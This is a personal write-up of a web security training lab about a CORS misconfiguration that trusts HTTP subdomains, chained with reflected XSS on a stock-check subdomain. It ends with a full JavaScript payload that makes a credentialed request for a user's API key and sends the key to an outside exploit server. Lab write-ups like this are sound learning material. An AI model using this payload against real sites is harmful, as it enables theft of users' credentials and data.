CORS vulnerability with trusted insecure protocols

**Category**: CORS  
**Difficulty**: Practitioner

---

## Overview / What I Learned

This lab demonstrates a CORS misconfiguration where the server trusts all subdomains regardless of whether they are using HTTP or HTTPS.
Combined with an XSS vulnerability on an HTTP subdomain, this can be exploited to steal sensitive information such as the administrator’s API key.

Key takeaways:
- CORS misconfigurations can become critical when combined with another weakness like XSS.
- Insecure protocols (HTTP) must never be allowed in CORS policies.
- Using `withCredentials` can allow sensitive data like cookies or auth headers to be sent cross-origin.

---

## Exploit Steps / Attack Methodology

### 1. Initial Recon
- Logged in with the credentials provided (`wiener:peter`) using Burp Suite’s browser.
- Navigated to the account page and observed a request to `/accountDetails` returning the API key.
- The response included:
  - `Access-Control-Allow-Origin` reflecting arbitrary subdomains.
  - `Access-Control-Allow-Credentials: true`.

### 2. Confirming CORS Misconfiguration
- Sent the `/accountDetails` request in Repeater with:
Origin: http://anything.lab-id.web-security-academy.net

- Observed the `Access-Control-Allow-Origin` header mirrored the origin, confirming the server trusted arbitrary subdomains over HTTP.

### 3. Finding XSS on an HTTP Subdomain
- Opened a product page and clicked "Check stock".

- Observed the request was made to:
http://stock.lab-id.web-security-academy.net/?productId=1&storeId=1

- Injected this payload into `productId`:
<script>alert(1)</script>

- Confirmed the subdomain was vulnerable to reflected XSS.

### 4. Exploit Development
- Used the XSS to execute a script that:
- Made a `withCredentials` request to the main site’s `/accountDetails` endpoint.
- Sent the response (API key) to the exploit server.

### 5. Exploit Payload Used

```html
<script>
  document.location = "http://stock.0ae800c704ce2fa38065dfe500a6005f.web-security-academy.net/?productId=2<script>" +
    "var req = new XMLHttpRequest();" +
    "req.onload = function() {" +
      "location = 'https://exploit-0ac400c204002f7d80b2decf014f0051.exploit-server.net/log?key=' + this.responseText;" +
    "};" +
    "req.open('GET', 'https://0ae800c704ce2fa38065dfe500a6005f.web-security-academy.net/accountDetails', true);" +
    "req.withCredentials = true;" +
    "req.send();" +
  "</script>&storeId=1";
</script>
